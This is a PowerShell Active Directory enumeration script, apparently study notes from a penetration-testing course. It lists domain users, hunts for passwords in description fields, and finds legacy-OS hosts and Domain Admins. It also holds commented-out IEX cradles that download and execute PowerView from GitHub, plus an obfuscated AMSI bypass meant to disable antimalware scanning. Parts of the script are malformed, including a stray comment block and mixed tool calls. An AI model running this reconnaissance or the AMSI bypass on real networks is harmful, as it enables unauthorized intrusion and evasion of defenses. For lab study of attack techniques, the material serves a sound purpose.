<#function Enumerate-AD {
[CmdletBinding()]
<#
.SYNOPSIS
Script to enumerate a Windows domain. Comments will discuss what actions are doing, etc.
Based on learning from PTA's A&DAD course

.DESCRIPTION
It will use either built-in capabilities (ninja), AD module (knight),
or Powerview (pirate) to obtain AD info based on how quiet you want to be

PARAMETER -mode ninja
Will only use built-in .NET capabilities to obtain information.
Stealthiest.

.PARAMETER -mode knight
Will leverage the AD module from MS. If it's not on the system already, it downloads Nikhil's copy via an IEX cradle. Works well on constrained language mode.
The IEX will make this less stealthy.

.PARAMETER -mode pirate
Will leverage PowerView to perform checks using an IEX cradle. Loud and proud.
The IEX plus use of PowerView makes this noisy.

.NOTES
 - Plenty of TODOs

.EXAMPLE
Enumerate-AD -mode pirate



param(
    [Parameter(Mandatory = true)
    [String]$mode
)
#>

#--## SETUP ##--#
Write "[+] Trying to import AD tools"

## Try to see if AD module is available:
#Import-Module ActiveDirectory

## If not, You can try to download the MS official AD module with this cradle (instead of having to manually install it)
#IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1')
#Import-ActiveDirectory
## In PTA labs, it's this:
Import-Module .\ADModule-master\ADModule-master\Microsoft.ActiveDirectory.Management.dll

## If noisy, grab powerview
#IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1')
## If PTA labs, grab locally
#IEX C:\AD\Tools\PowerView.ps1


#--## GENERAL DOMAIN INFO ##--#

## NATIVE ##
## Gets current domain info and stores in obj
$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]

## Calls static method to get domain summary from ADClass object
Write "[+] Current Forest, Domain, DC's, PDC, etc."
$ADClass::GetCurrentDomain()
## Get current domain level and print
$ADFuncLevel = $ADClass::GetComputerDomain().DomainModeLevel


## AD MODULE ##
## Get domain info
$ADClass = Get-ADDomain
Get-ADDomain -Identity moneycorp.local  # Specify domain
Get-DomainSID

## POWERVIEW ##
## Get domain info
$ADClass = Get-NetDomain
Get-NetDomain -Domain moneycorp.local  # Specify domain
(Get-ADDomain).DomainSID

Switch($ADFuncLevel) {
    0 {"[+] Domain Level: Windows 2000 Domain"}
    1 {"[+] Domain Level: Windows 2003 Interim Domain"}
    2 {"[+] Domain Level: Windows 2003 Domain"}
    3 {"[+] Domain Level: Windows 2008 Domain"}
    4 {"[+] Domain Level: Windows 2008 R2 Domain"}
    5 {"[+] Domain Level: Windows 2012 Domain"}
    6 {"[+] Domain Level: Windows 2012 R2 Domain"}
    7 {"[+] Domain Level: Windows 2016 Domain"}
}

##--## GET DOMAIN POLICY INFO ##--##

## POWERVIEW ##
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."Kerberos Policy"

## AD MODULE ##
Get-ADDefaultDomainPasswordPolicy  # Gets password policy



##--## GET DOMAIN CONTROLLER INFO ##--##

## POWERVIEW ##
Get-NetDomainController

## AD MOD ##
Get-ADDomainController


##--## GET DOMAIN USER INFO ##--##
## Get all users with all properties
Write "[+] Getting Domain Users..."
Get-NetUser -Filter * -Properties *  # pview
Get-ADUser -Filter * -Properties *  # ADmod
## Find users with Descriptions set:
Write "[+] Looking for Users with Description fields set. Check for Passwords:"
Find-Userfield -SearchField Description -Searchterm "*"  # pview
Get-ADUser -Filter 'Description -like "*"' -Properties Description | select Name,Description

##--## GET DOMAIN COMPUTER INFO ##--##
Write "[+] Getting Domain Computers..."
Get-NetComputer -FullData  # pview
Get-ADComputer -Filter *  # ADmod

Write "[+] Getting Old OS's..."
Get-NetComputer -OperatingSystem "*XP*"  # pview
Get-NetComputer -OperatingSystem "*Vista*"  # pview
Get-NetComputer -OperatingSystem "*200*"  # pview

Get-ADComputer -Filter 'OperatingSystem -like "*XP*"' -Properties OperatingSystem | Select Name,OperatingSystem  # ADmod
Get-ADComputer -Filter 'OperatingSystem -like "*Vista*"' -Properties OperatingSystem | Select Name,OperatingSystem  # ADmod
Get-ADComputer -Filter 'OperatingSystem -like "*200*"' -Properties OperatingSystem | Select Name,OperatingSystem  # ADmod

##--## GET DOMAIN GROUP INFO ##--##
Write "[+] Getting Domain Groups..."

Get-ADGroup -Filter * -Properties SamAccountName | Select SamAccountName  # ADmod

Write "[+] Getting Domain Admins..."

(Get-ADGroup -filter 'SamAccountName -eq "Domain Admins"' -Properties Members).members  # ADmod

Write "[+] Getting other potentially powerful groups + members..."

## AMSI BYPASS, NEEDS OBFUSCATION
# [Delegate]::CreateDelegate(("Func``3String[String,$(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName),System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Ty'+'pe')),[Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('Ge'+'tFiel'+'d')).Invoke('amsiInitFailed'),(('No'+'nPub'+'li'+'c,Stat'+'ic') -as [String].Assembly.GetType('System.Reflection.Bind'+'in'+'gFl'+'ags')).SetValue($null,$True)
